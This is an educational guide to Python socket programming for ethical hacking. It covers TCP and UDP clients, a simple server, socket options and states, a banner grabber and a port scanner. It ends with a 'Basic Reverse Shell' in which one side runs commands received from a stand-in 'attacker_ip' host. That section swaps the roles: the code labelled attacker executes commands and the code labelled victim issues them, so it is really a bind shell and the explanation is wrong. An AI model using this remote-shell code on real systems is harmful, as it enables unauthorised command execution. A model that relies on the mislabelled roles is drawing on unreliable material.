# Sockets

## Overview of Sockets

Sockets are communication endpoints that allow programs to communicate with each other across a network or within the same machine. They form the foundation for all network communications and are essential for understanding network-based attacks and defenses.

## Socket Fundamentals

### What is a Socket?
- A socket is an endpoint for sending and receiving data across a network
- Consists of an IP address and a port number (e.g., 192.168.1.1:80)
- Enables two-way communication between processes
- Can be used for both connection-oriented (TCP) and connectionless (UDP) communications

### Socket Types
- **Stream Sockets (SOCK_STREAM)**: Use TCP for reliable, ordered data transmission
- **Datagram Sockets (SOCK_DGRAM)**: Use UDP for faster but unreliable data transmission
- **Raw Sockets**: Allow direct access to lower-level protocols (requires administrative privileges)

### Socket Operations
- **Bind**: Associate a socket with a specific port and interface
- **Listen**: Mark a socket as passive, waiting for incoming connections
- **Accept**: Accept an incoming connection attempt
- **Connect**: Establish a connection to a remote socket
- **Send/Recv**: Transfer data between connected sockets
- **Close**: Terminate a socket connection

## Python Socket Programming

### Creating a Basic TCP Socket
```python
import socket

# Create a TCP socket
client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Connect to a remote server
client.connect(("example.com", 80))

# Send HTTP GET request
request = "GET / HTTP/1.1\r\nHost: example.com\r\n\r\n"
client.send(request.encode())

# Receive response
response = client.recv(4096)
print(response.decode())

# Close the socket
client.close()
```

### Creating a Basic UDP Socket
```python
import socket

# Create a UDP socket
client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

# No connection needed for UDP
message = "Hello, server!"
client.sendto(message.encode(), ("example.com", 53))

# Receive response
data, addr = client.recvfrom(4096)
print(f"Received from {addr}: {data.decode()}")

# Close the socket
client.close()
```

### Creating a Simple TCP Server
```python
import socket

# Create a TCP socket
server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Allow port reuse
server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

# Bind to an address and port
server.bind(("0.0.0.0", 9999))

# Listen for incoming connections (queue up to 5 connections)
server.listen(5)
print("Listening on port 9999...")

while True:
    # Accept client connection
    client, addr = server.accept()
    print(f"Accepted connection from {addr[0]}:{addr[1]}")
    
    # Receive data
    request = client.recv(1024)
    print(f"Received: {request.decode()}")
    
    # Send response
    response = "Hello, client!"
    client.send(response.encode())
    
    # Close client connection
    client.close()
```

## Socket Options and Flags

### Common Socket Options
- **SO_REUSEADDR**: Allow reuse of local addresses
- **SO_KEEPALIVE**: Keep connections active with keepalive packets
- **SO_LINGER**: Control how close() works
- **SO_TIMEOUT**: Set timeout for socket operations

### Setting Socket Options
```python
import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Allow port reuse
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

# Set timeout (in seconds)
s.settimeout(10)
```

## Socket Security Considerations

### Security Issues with Sockets
- **Unauthorized access**: Unsecured sockets may allow unauthorized connections
- **Data interception**: Unencrypted socket communications can be sniffed
- **Denial of Service**: Floods of connections can exhaust resources
- **Buffer overflows**: Improper handling of socket data can lead to vulnerabilities

### Best Practices
- Implement proper authentication for socket connections
- Use TLS/SSL for encrypting socket communications
- Validate and sanitize all data received from sockets
- Implement proper error handling and timeouts
- Use non-blocking sockets for high-performance applications
- Close sockets properly when finished

## Socket Use Cases in Ethical Hacking

### Network Reconnaissance
- Port scanning to identify open services
- Banner grabbing to identify service versions
- Network mapping and topology discovery

### Vulnerability Assessment
- Testing for open ports and services
- Checking for misconfigured services
- Identifying unpatched or vulnerable services

### Exploitation
- Establishing command and control channels
- Creating reverse shells
- Data exfiltration

### Post-Exploitation
- Maintaining persistent access
- Lateral movement within networks
- Internal reconnaissance

## Advanced Socket Concepts

### Non-blocking Sockets
- Allow programs to perform other tasks while waiting for socket operations
- Used in high-performance network applications
- Implemented using `setblocking(0)` or by setting timeouts

### Socket Timeouts
```python
import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Set timeout to 5 seconds
s.settimeout(5)

try:
    s.connect(("example.com", 80))
    # Connection succeeded within timeout
except socket.timeout:
    print("Connection timed out")
```

### Socket States
- **CLOSED**: Socket not in use
- **LISTEN**: Listening for incoming connections
- **SYN_SENT**: Client has sent SYN packet, waiting for response
- **SYN_RECEIVED**: Server received SYN, sent SYN-ACK, waiting for ACK
- **ESTABLISHED**: Connection established, data can be exchanged
- **FIN_WAIT**: Socket closed, waiting for ACK of FIN
- **CLOSE_WAIT**: Remote end closed, waiting for local close
- **TIME_WAIT**: Waiting for delayed packets to clear after connection close

## Socket Programming for Ethical Hacking

### Banner Grabbing
```python
import socket

def grab_banner(ip, port):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        s.connect((ip, port))
        banner = s.recv(1024)
        return banner.decode().strip()
    except:
        return None
    finally:
        s.close()

# Example usage
banner = grab_banner("192.168.1.1", 22)
if banner:
    print(f"Banner: {banner}")
```

### Simple Port Scanner
```python
import socket

def scan_port(ip, port):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(1)
        result = s.connect_ex((ip, port))
        s.close()
        return result == 0
    except:
        return False

# Scan common ports
target = "192.168.1.1"
common_ports = [21, 22, 23, 25, 53, 80, 443, 445, 3389]

for port in common_ports:
    if scan_port(target, port):
        print(f"Port {port} is open")
    else:
        print(f"Port {port} is closed")
```

### Basic Reverse Shell
```python
# Server (attacker) code
import socket
import subprocess

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind(("0.0.0.0", 9999))
server.listen(5)

client, addr = server.accept()
print(f"Connection from {addr}")

while True:
    cmd = client.recv(1024).decode()
    if cmd.lower() == "exit":
        break
    output = subprocess.getoutput(cmd)
    client.send(output.encode())

client.close()
server.close()

# Client (victim) code
import socket

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect(("attacker_ip", 9999))

while True:
    cmd = input("Shell> ")
    client.send(cmd.encode())
    if cmd.lower() == "exit":
        break
    output = client.recv(4096).decode()
    print(output)

client.close()
```

## Resources for Learning More About Sockets

### Documentation
- Python Socket Library Documentation
- RFC 793 (TCP) and RFC 768 (UDP)
- Man pages for socket functions (e.g., `man socket`)

### Books
- "Network Programming with Python" by Jan Bodnar
- "Black Hat Python" by Justin Seitz
- "Violent Python" by TJ O'Connor

### Online Resources
- Python Documentation: https://docs.python.org/3/library/socket.html
- Socket Programming HOWTO: https://docs.python.org/3/howto/sockets.html
